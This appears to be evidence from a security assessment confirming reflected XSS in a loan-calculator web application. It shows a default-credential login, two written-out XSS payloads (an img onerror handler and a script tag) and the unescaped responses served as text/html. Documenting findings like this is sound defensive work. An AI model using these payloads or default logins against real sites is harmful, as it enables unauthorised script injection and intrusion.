evidence:
POC successfully authenticated with default credentials and injected XSS payloads:

Test 1 - Image tag with onerror handler:
- Payload: &lt;img src=x onerror=alert(1)&gt;
- Response: { \"loan_principal\": \"&lt;img src=x onerror=alert(1)&gt;\" ,\"monthly_payment\": \"10.0\", \"loan_term_amount\": \"12\", \"total_loan_payments\": \"120.0\" }
- Result: XSS payload reflected unescaped in HTML response

Test 2 - Script tag:
- Payload: &lt;script&gt;alert(\"xss\")&lt;/script&gt;
- Response: { \"loan_principal\": \"&lt;script&gt;alert(\"xss\")&lt;/script&gt;\" ,\"monthly_payment\": \"10.0\", \"loan_term_amount\": \"12\", \"total_loan_payments\": \"120.0\" }
- Result: Script tag payload reflected unescaped in HTML response

Content-Type verification:
- Content-Type: text/html; charset=utf-8
- Result: Response is served as text/html, meaning scripts would execute in browser context

Both payloads are rendered without encoding or escaping, confirming the reflected XSS vulnerability.
